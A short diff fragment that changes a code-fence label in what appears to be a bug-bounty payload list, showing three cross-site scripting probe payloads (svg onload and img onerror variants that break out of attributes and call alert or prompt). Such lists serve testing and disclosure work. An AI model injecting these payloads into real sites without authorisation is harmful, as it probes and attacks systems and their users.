@@ -1,5 +1,5 @@
 
-```javascript
+```
 "><svg/onload=prompt(/OPENBUGBOUNTY/)>
 '"--!><img src=x onerror=alert("OPENBUGBOUNTY")> 
 '"/><svg/onload=prompt(/OPENBUGBOUNTY/)>
